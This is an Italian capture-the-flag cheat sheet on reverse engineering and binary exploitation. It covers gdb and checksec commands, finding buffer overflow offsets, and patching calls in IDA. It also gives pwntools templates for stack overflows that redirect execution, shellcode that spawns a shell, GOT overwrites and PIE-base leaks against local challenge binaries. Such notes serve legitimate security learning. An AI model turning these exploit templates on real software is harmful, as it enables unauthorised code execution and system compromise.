# Rev-PWN

### General terminal command

- **strings *nomeFile*** → Stampa tutte le stringhe del programma
- **checksec *nomeFile*** → per vedere struttura file
- **cat *nomeFile*** → per vedere contenuto file

### GDB debbuger

- **gdb *nomeFile →*** per aprire debbugger del file
    - **break *nomeFunzione*/break **indirizzoMemFunzione →*** per impostare un breakpoint nella funzione
    - **jump *nomeFunzione →*** per chiamare quella funzione
    - **disas *nomeFunzione →*** per vedere cosa fa la funzione (a volte può essere necessario inserire prima un breakpoint)
    - **x/s *indirizzoMemVariabile →*** stampa valore della variabile
    - **info registers** → permette di vedere i registri del file
- **checksec *nomeFile →*** per verificare se RELRO è FULL quindi file protetto da scritture sullo stack
    
    **Calcolare buffer**
    
    - **pattern_create *dimPattern nomePattern***
    - **run < *nomePattern** → per runnare il pattern*
    - **pattern search** → per vedere la dimensione del buffer
        - **EIP+0 found at offset: *dimBuffer →*** dimBuffer sarà la dimensione che dovremo utilizzare

### IDA Tip

- **Evitare la chiamata di una funzione** → cliccare su di essa, e cambiare il suo esadecimale con tutti 90 (edit → patch program → change byte. Per salvare: edit → patch program → apply to input files)
- **Leggere cella di memoria di una funzione** → Andare su finestra exports

### PWN

```python
from pwn import *

garbage = b'java'+b'A'*28
address = p64(0x4007a2) #indirizzo che vogliamo che venga chiamato dopo aver fatto overflow
p = process('./java')
p.sendline(garbage+address)
p.interactive() #da usare se con questo codice si aprira una shell da cui poi dovremo operare
#p.recvall() da usare al posto di interactive se il programma termina e vogliamo ottenere l'output
#----------------------------------------------------------
#Per ottenere l'indirizzo della funzione che vogliamo chiamare
elf=ELF('./java')
address = p64(elf.symbols['print_flag'])
#----------------------------------------------------------
p.sendline(asm(shellcraft.sh())) #se è necessario generare una shell
#-----------------------------------------------------------
exit_got = elf.got['exit'] #da usare se la funzione è in GOT (quindi cambia indirizzo)
#--------DA USARE SE PIE ATTIVO-------------------
from pwn import *

p=process('./challenge')
main =p.unpack()
elf = ELF('./challenge')
elf.address=main-elf.symbols['main']
where = elf.symbols['read']
what = elf.symbols['oh_look_useful']

p.pack(where)
p.pack(what)
p.interactive()
```

### C functions

```c
__asm__() //è molto probabile che sia da arrivare a questa funzione e chiamare una shell
```
